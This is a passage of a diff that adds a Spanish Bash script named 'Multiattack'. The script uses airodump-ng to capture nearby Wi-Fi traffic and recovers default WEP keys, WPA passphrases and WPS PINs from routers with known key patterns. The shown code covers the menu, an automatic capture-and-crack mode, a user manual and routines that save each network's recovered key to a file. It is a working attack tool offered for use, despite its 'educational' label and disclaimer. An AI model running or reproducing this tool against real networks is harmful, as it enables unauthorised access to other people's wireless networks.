+redabierta=$(($redabierta+1))
+fi
+fi
+
+
+r=$(($r-1))
+done
+#
+#   Guardando datos en archivo y mostrando resusltados por pantalla
+#
+echo " "
+echo "--   Terminado. "
+sleep 3
+rm  -rf $TEMP/multiattack.txt
+> $TEMP/multiattack.txt
+> $TEMP/keyswep
+> $TEMP/keyswpa
+i=0
+WEPi=0
+WPAi=0
+contadorkeys=0
+while [ 2 -le $p ]; do
+	if [ "${clave[$p]}" != "" ]; then
+#	i=$(($i+1))
+# Rellenar clave y ESSID con puntos para mostrar por pantalla de forma alineada
+largo=${clave[$p]}
+ESSD=${H_SSID[$p]}
+function rellenarclave {
+longclave=${#largo}
+if [ $longclave -le 25 ]; then
+largo=$largo"."
+rellenarclave
+fi
+}
+function rellenaressid {
+longESSID=${#ESSD}
+if [ $longESSID -le 13 ]; then
+ESSD=$ESSD"."
+rellenaressid
+fi
+}
+rellenaressid
+if [ "${clave[$p]}" != ".NO SE ENCONTRO LA CLAVE.." ] ; then
+rellenarclave
+# Asignar clave de 26 caracteres en HEXA a claveHEX
+claveHEX=$largo
+contadorkeys=$(($contadorkeys+1))
+
+#fi
+# convertir clave en HEXA a ASCII
+if [ ${H_ENC[$p]} = "WEP" ];then
+claveHEX2ASCII=${clave[$p]}
+HexString2ASCII $claveHEX2ASCII
+claveASCII=$HexString2ASCIIResult
+# si la clave no se puede pasar a ASCII rellenar con 13 puntos para alinear en pantalla
+if [ $HexStringToASCIINotFullyPrintable = "true" ]; then
+claveASCII="............."
+fi
+fi
+fi
+if [ "${clave[$p]}" = ".NO SE ENCONTRO LA CLAVE.." ] ; then
+claveHEX=${clave[$p]}
+claveASCII="............."
+fi
+
+if [ "${clave[$p]}" = "...LA RED ESTA ABIERTA...." ]; then
+claveHEX=${clave[$p]}
+claveASCII="............."
+fi
+# Guardar resusltados en fichero temporal dependiendo si encriptacion WEP o WPA
+
+#echo ${H_ENC[$p]}
+# Con encriptacion WEP 
+if [ ${H_ENC[$p]} != "WPA" ] && [ ${H_ENC[$p]} != "WPA2" ]; then
+WEPi=$(($WEPi+1))
+
+echo "$WEPi) $ESSD  $claveHEX  $claveASCII ${H_ENC[$p]} ${H_MAC[$p]}" >> $TEMP/keyswep
+#  Guardar clave en archivo con ESSID y MAC de la red WEP
+ if [ "${clave[$p]}" != ".NO SE ENCONTRO LA CLAVE.." ] ; then
+
+MACsinpuntos="`echo ${H_MAC[$p]}|tr -d ':'`"
+archivoclave="${H_SSID[$p]}--$MACsinpuntos"
+> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "Key obtenida con Multiattack $version" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "RED: ${H_SSID[$p]} " >> $DUMP_key/$archivoclave
+echo  "MAC: ${H_MAC[$p]}  " >> $DUMP_key/$archivoclave 
+echo  "" >> $DUMP_key/$archivoclave
+echo  "KEY en HEXADECIMAL ....  ${clave[$p]} " >> $DUMP_key/$archivoclave
+echo  "KEY en ASCII  .........  $claveASCII " >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo "Para mayor seguridad de su red se recomienda que cambie la clave " >> $DUMP_key/$archivoclave
+echo "por defecto y se utilice cifrado WPA con una clave robusta" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo "Visita: www.seguridadwireless.net" >> $DUMP_key/$archivoclave
+fi
+else
+# Con encriptacion WPA
+WPAi=$(($WPAi+1))
+
+echo "$WPAi) $ESSD  $claveHEX  ${PINWPS[$p]}  ${H_ENC[$p]} ${H_MAC[$p]}" >> $TEMP/keyswpa
+#  Guardar clave en archivo con ESSID y MAC de la red WPA
+ MACsinpuntos="`echo ${H_MAC[$p]}|tr -d ':'`"
+archivoclave="${H_SSID[$p]}--$MACsinpuntos"
+> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "Key obtenida con Multiattack $version" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "RED: ${H_SSID[$p]} " >> $DUMP_key/$archivoclave
+echo  "MAC: ${H_MAC[$p]}  " >> $DUMP_key/$archivoclave 
+echo  "" >> $DUMP_key/$archivoclave
+echo  "Passphrase ....  ${clave[$p]} " >> $DUMP_key/$archivoclave
+echo  "PIN-WPS .......  ${PINWPS[$p]}" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo "Para mayor seguridad de su red se recomienda que cambie la clave " >> $DUMP_key/$archivoclave
+echo "por defecto y se utilice cifrado WPA con una clave robusta" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo  "" >> $DUMP_key/$archivoclave
+echo "Visita: www.seguridadwireless.net" >> $DUMP_key/$archivoclave
+fi
+
+fi
+p=$(($p-1))
+done
+
+# Guardar resusltados en Multiattack.txt
+#echo "$i) $ESSD  $claveHEX  $claveASCII ${H_ENC[$p]} ${H_MAC[$p]}" >> $DUMP_key/multiattack.txt
+
+#guardar cabecera del archivo
+echo "" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+echo "  	M U L T I A T T A C K   P A R A   P A T R O N E S   C O N O C I D O S" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+echo "                  * * *     R E S U L T A D O     * * *                " >> $TEMP/multiattack.txt
+
+# #leer resultados WEP y guardar en archivo multiattack.txt SI HAY DATOS WEP
+if [ $WEPi != 0 ]; then
+echo "" >> $TEMP/multiattack.txt
+echo "*************************  Redes con encriptacion WEP  ******************************" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+echo "     ESSID         CLAVE HEXA                  CLAVE ASCII    ENC  MAC" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+cat  $TEMP/keyswep >> $TEMP/multiattack.txt 
+rm  -rf $TEMP/keyswep
+echo "" >> $TEMP/multiattack.txt
+echo "*************************************************************************************" >> $TEMP/multiattack.txt
+fi
+
+#leer resultados WPA y guardar en archivo multiattack.txt SI HAY DATOS WPA
+if [ $WPAi != 0 ]; then
+echo "" >> $TEMP/multiattack.txt
+echo "*************************  Redes con encriptacion WPA  ******************************" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+echo "     ESSID         PASSPHRASE                  PIN-WPS         ENC  MAC" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+cat  $TEMP/keyswpa >> $TEMP/multiattack.txt 
+
+rm  -rf $TEMP/keyswpa
+echo "" >> $TEMP/multiattack.txt
+echo "*************************************************************************************" >> $TEMP/multiattack.txt
+
+fi
+
+
+
+fi
+# si no se obtienen resultados...
+	if [ "$contadorkeys" = "0" ];then
+	clear
+echo ""
+echo ""
+echo "  	M U L T I A T T A C K   P A R A   P A T R O N E S   C O N O C I D O S"
+echo ""
+echo "                  * * *     A T E N C I O N     * * *                "
+echo ""
+echo "                     No Se han obtenido resultados"
+echo ""
+echo "       Puede ser que en la captura no hayan REDES con patron conocido "
+echo "               o que no habian sufifcientes DATA's capturados"
+echo ""
+echo "                     Pulsa INTRO para volver al menú"
+read yn
+	else
+	clear
+echo "" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+echo "         Se ha(n) obtenido la(s) clave(s) por defecto de '$contadorkeys' red(es)" >> $TEMP/multiattack.txt
+if [ $redabierta != "" ]; then
+echo "         Y se ha(n) encontrado '$redabierta' red(es) abierta(s). "  >> $TEMP/multiattack.txt
+fi
+echo "" >> $TEMP/multiattack.txt
+echo "         Los resultados se han guardado en el direcctorio:" >> $TEMP/multiattack.txt
+echo "         $DUMP_key" >> $TEMP/multiattack.txt
+echo "" >> $TEMP/multiattack.txt
+xterm -hold -title "Multiattack $version RESULTADOS..." $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e cat $TEMP/multiattack.txt  & sleep 1
+rm  -rf $TEMP/multiattack.txt
+	fi
+echo ""
+menu
+	else
+clear
+	echo "                  * * *     A T E N C I O N     * * *                "
+	echo ""
+	echo "                  No se ha encontrado ninguna captura"
+	echo "                  antes debes capturar objetivos"
+	echo ""
+fi
+
+
+echo "                     Pulsa INTRO para volver al menú"
+	read yn
+menu
+}
+
+#Manual basico
+function manual {
+clear
+> $TEMP/manual.txt 
+  echo "" >> $TEMP/manual.txt 
+  echo "                       ++ MANUAL ++ MANUAL ++ MANUAL ++ MANUAL ++ MANUAL ++  " >> $TEMP/manual.txt 
+  echo "" >> $TEMP/manual.txt 
+  echo "   Opción 1-. MODO AUTOMATICO. Con esta opción obtenemos las keys por defecto de forma automatica." >> $TEMP/manual.txt 
+  echo "              Sólo deberemos fijar el tiempo (en minutos) que queremos que dure la captura y el " >> $TEMP/manual.txt 
+  echo "              programa se encargara de hacer la captura y mostrar los resultados después de que " >> $TEMP/manual.txt 
+  echo "              transcurra el tiempo fijado. " >> $TEMP/manual.txt 
+  echo "   Opción 2-. ESCANEO DE REDES. Con esta opción veremos las redes en nuestro alcance,con esto solo"  >> $TEMP/manual.txt 
+  echo "              visualizamos, no estamos capturando paquetes." >> $TEMP/manual.txt 
+  echo "              IMPORTANTE si tenemos muchas redes a nuestro alcance hacer un ataque selectivo por " >> $TEMP/manual.txt 
+  echo "              canales para no saturar el archivo de captura de datos" >> $TEMP/manual.txt 
+  echo "   Opción 3-. CAPTURA DE DATOS. Con esta opción iniciaremos la captura de de las redes a nuestro" >> $TEMP/manual.txt 
+  echo "              alcance. Antes de iniciar la captura se muestra un submenu en el que podemos hacer " >> $TEMP/manual.txt 
+  echo "              una seleccion de los canales de los que queremos capturar " >> $TEMP/manual.txt 
+  echo "              Pulsando ENTER capturaremos de todos los canales a nuestro alcance" >> $TEMP/manual.txt 
+  echo "              Escribiendo (por ej.) 6 capturaremos datos del canal 6" >> $TEMP/manual.txt 
+  echo "              Escribiendo (por ej.) 1-5 capturaremos datos de los canales 1 al 5" >> $TEMP/manual.txt 
+  echo "              Escribiendo (por ej.) 1,6,11 capturaremos datos de los canales 1, 6 y 11" >> $TEMP/manual.txt 
+  echo "              Una vez tengamos suficientes DATAS cerraremos la shell de captura." >> $TEMP/manual.txt 
+  echo "            ### DEBEN TENER AL MENOS 4 DATAS PARA PODER DESCIFRAR LA KEY GENERICA ###" >> $TEMP/manual.txt 
+  echo "   Opción 4-. OBTENER KEY's POR DEFECTO. Una vez hecha la captura, con esta opción , se ejecutará" >> $TEMP/manual.txt 
+  echo "              el ataque para la obtención de KEY'S de las redes en las que es conocido el patrón" >> $TEMP/manual.txt 
+  echo "              que las genera. El resultado se visualizará en pantalla y se guardará en" >> $TEMP/manual.txt 
+  echo "              $DUMP_key" >> $TEMP/manual.txt 
+  echo "   Opción 5-. OBTENER KEY's CON ESSID CAMBIADO. Es igual que la opción anterior, pero en este caso," >> $TEMP/manual.txt 
+  echo "              tambien se hará el ataque para la obtención de KEY'S de redes cuyos nombres hayan sido" >> $TEMP/manual.txt 
+  echo "              cambiados pero que se han respetado las claves por defecto." >> $TEMP/manual.txt 
+  echo "   Opción 6-. Ejecutar Airoscript Nuevo WifiWay. Desde aquí lanzaremos Airoscript y utilizar en él" >> $TEMP/manual.txt 
+  echo "              las capturas hechas con Multiattack" >> $TEMP/manual.txt 
+  echo "   Opcion 7-. Ejecuta airmon para seleccionar-montar tarjeta en modo monitor." >> $TEMP/manual.txt 
+  echo "   Opcion 8-. MANUAL DE USO. Muestra esta pantalla." >> $TEMP/manual.txt 
+  echo "   Opción 0-. Salir. Desde aquí cerraremos Multiattack, pudiendo antes desmontar o no la tarjeta" >> $TEMP/manual.txt 
+  echo "              que se ha montado en modo monitor." >> $TEMP/manual.txt 
+  echo "" >> $TEMP/manual.txt 
+  echo "" >> $TEMP/manual.txt 
+xterm -hold -title "Multiattack $version MANUAL DE USO" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e cat $TEMP/manual.txt   & sleep 1
+rm  -rf $TEMP/manual.txt
+menu
+}
+
+# Modo Automatico 
+function automode {
+clear
+echo ""
+echo "                     M U L T I A T T A C K   ( Modo Automático)"
+echo ""
+echo ""
+echo "                    ¿ cuanto tiempo quieres que dure la captura? "
+echo "                    (introducir el tiempo en minutos)"
+echo "  "
+echo " "
+function time_scan {
+read time
+if [ "$time" = "" ];then
+time_scan
+fi
+}
+time_scan
+timescan="$time""m"
+
+chan=""
+
+echo "                   Seleccione ahora el Canal de Capturas     "
+echo ""
+echo "                   Un solo canal     6 "
+echo "                   Rango de canales  1-5 "
+echo "                   Multiples canales 1,2,5-7,11"
+echo "                   Para todos los canales ENTER "
+echo ""
+echo "                   Para volver al MENU -> m "
+  read DUMP_channel
+if [ "$DUMP_channel" = "m" ]; then
+menu
+fi
+clear
+   if [ "$DUMP_channel" = "$chan" ]; then
+   canal="... Todos los canales..."
+   else
+   canal="El[os] Canal[es] ... $DUMP_channel ..."
+   fi
+echo ""
+echo "                     M U L T I A T T A C K   ( Modo Automático)"
+echo ""
+echo ""
+echo "                    La captura de datos durará... $time  minutos"
+echo "                    Se atacarán $canal"
+echo ""
+echo "                    Iniciando..."
+echo ""
+echo "                    ...NO interumpir la captura..."
+sleep 3
+if [ -e $DUMP_PATH/dump-01.cap ]; then
+rm  $DUMP_PATH/dump*
+fi
+   if [ "$DUMP_channel" = "$chan" ]; then
+xterm $HOLD -title "Capturando Objetivos en $canal..." $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng  -w $DUMP_PATH/dump -a $WIFI & sleep $timescan
+   else
+xterm $HOLD -title "Capturando Objetivos en $canal..." $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --channel "$DUMP_channel" -w $DUMP_PATH/dump -a $WIFI & sleep $timescan
+fi
+pkill airodump-ng 
+echo "                    Captura finalizada."
+echo ""
+echo "                    Se va a iniciar la busqueda de keys..."
+sleep 3
+
+ESSID_cambiado="off"
+auto=""
+autocrack
+
+}
+
+# MENU principal
+function menu {
+#
+while true; do
+clear
+ESSID_cambiado=""
+auto=""
+only=""
+choose=""
+  echo ""
+  echo ""
+  echo "  	M U L T I A T T A C K   P A R A   P A T R O N E S   C O N O C I D O S"
+  echo ""
+  echo "	####################################################################"
+  echo "	###                  Multiattack "$version"                  ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "        ###   1) Modo Automático                                         ###"
+  echo "        ###   2) Iniciar Escaneo de Redes                                ###"
+  echo "        ###   3) Iniciar Captura en busca de objetivos                   ###"
+  echo "        ###   4) Obtener KEY's por defecto                               ###"
+  echo "        ###   5) Obtener KEY's con ESSID cambiado                        ###"
+  echo "        ###   6) Ejecutar Airoscript Nuevo WifiWay                       ###"
+  echo "        ###   7) Ejecutar airmon (poner-cambiar tarjeta en modo monitor) ###"
+  echo "        ###   8) Manual de uso                                           ###"
+  echo "        ###                                                              ###"
+  echo "        ###   0) Salir                                                   ###"
+  echo "	###                                                              ###"
+  echo "	###                                                              ###"
+  echo "	###   NOTA: Si Quieres intentar el ataque a AP's cuyo ESSID      ###"
+  echo "        ###         por defecto pueda haber sido cambiado, pero          ###"
+  echo "	###         posiblemente mantengan la KEY por defecto,           ###"
+  echo "	###         escoge la opcion 5), pero ten en cuenta que          ###"
+  echo "	###         los ataques pueden demorarse una media de 15         ###"
+  echo "	###         minutos por AP con ESSID cambiado.                   ###"
+  echo "	###                                                              ###"
+  echo "	####################################################################"
+  read yn
+  case $yn in
+    0 ) DESMONTAR_tarj_y_salir ; break ;;
+    1 ) auto="on"; auto_select_monitor ; break ;;
+    2 ) only="on"; auto_select_monitor ; break ;;
+    3 ) choose="on"; auto_select_monitor ; choosescan ; break ;;
+    4 ) ESSID_cambiado="off" ; autocrack; break ;;
+    5 ) ESSID_cambiado="on" ; autocrack; break ;;
+    6 )  konsole -T "Airoscript Nuevo WifiWay" -e airoscript.cw; menu; break ;;
+    7 ) monitor_mode ; break ;;
+    8 ) manual ; break ;;
+    * ) ;;
+  esac
+done 
+clear
+}
+# bienvenida
+clear
+echo "                         Multiattack "$version
+echo ""
+echo "      -Multiattack es una herramienta educativa "
+echo "       para el conocimiento del funcionamiento de la seguridad WIFI"
+echo "      -Rutas de capturas en $DUMP_PATH"
+echo " "
+echo "                    Visita: www.seguridadwireless.net"
+echo "                            www.elhacker.net"
+echo ""
+# acuerdate siempre de esto, eres un vulgar copion que siempre seras un segundon 
+#                                (esto me gustó {m.k.})
+echo "       Para mayor seguridad de su red se recomienda que cambie la clave "
+echo "       por defecto y se utilice cifrado WPA con una clave robusta"
+echo ""
+echo "                               -------------"
+echo ""
+echo "       No me hago responsable del mal uso que se pueda hacer de este Script"
+echo ""
+echo "                               -------------"
+echo ""
+echo "                Este mensaje desaparecera en pocos segundos"
+sleep 1
+echo "                        Saludos desde wifislax.org"
+sleep 2
+
+
+function setresolution {
+echo ""
+#echo -n Autodetectando Resolución...
+detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
+#echo $detectedresolution
+##  A) 1024x768
+##  B) 1280x768
+##  C) 1280x1024
+##  D) 1600x1200
+case $detectedresolution in
+   "1024x768" ) resA ;;
+   "1280x768" ) resB ;;
+   "1366x768" ) resB ;;
+  "1280x1024" ) resC ;;
+  "1600x1200" ) resD ;;
+            * ) resA ;; ## fallback a una opción segura
+esac
+}
+function resA {
+# Upper left window +0+0 (size*size+position+position)
+TOPLEFT="-geometry 92x14+0+0"
+# Upper right window -0+0
+TOPRIGHT="-geometry 68x25-0+0"
+# Bottom left window +0-0
+BOTTOMLEFT="-geometry 92x36+0-0"
+# Bottom right window -0-0
+BOTTOMRIGHT="-geometry 74x20-0-0"
+TOPLEFTBIG="-geometry 100x52+0+0"
+TOPRIGHTBIG="-geometry 74x30-0+0"
+}
+function resB {
+# Upper left window +0+0 (size*size+position+position)
+TOPLEFT="-geometry 100x20+0+0"
+# Upper right window -0+0
+TOPRIGHT="-geometry 109x20-0+0"
+# Bottom left window +0-0
+BOTTOMLEFT="-geometry 100x30+0-0"
+# Bottom right window -0-0
+BOTTOMRIGHT="-geometry 109x20-0-0"
+TOPLEFTBIG="-geometry  100x52+0+0"
+TOPRIGHTBIG="-geometry 109x30-0+0"
+}
+function resC {
+# Upper left window +0+0 (size*size+position+position)
+TOPLEFT="-geometry 110x35+0+0"
+# Upper right window -0+0
+TOPRIGHT="-geometry 99x40-0+0"
+# Bottom left window +0-0
+BOTTOMLEFT="-geometry 110x35+0-0"
+# Bottom right window -0-0
+BOTTOMRIGHT="-geometry 99x30-0-0"
+TOPLEFTBIG="-geometry 110x72+0+0"
+TOPRIGHTBIG="-geometry 99x40-0+0"
+}
+function resD {
+# Upper left window +0+0 (size*size+position+position)
+TOPLEFT="-geometry 130x43+0+0"
+# Upper right window -0+0
+TOPRIGHT="-geometry 68x25-0+0"
+# Bottom left window +0-0
+BOTTOMLEFT="-geometry 130x40+0-0"
+BOTTOMRIGHT="-geometry 132x35-0-0"
+TOPLEFTBIG="-geometry 130x85+0+0"
+TOPRIGHTBIG="-geometry 132x48-0+0"
+}
+
+setresolution
+
+menu
+
+#end
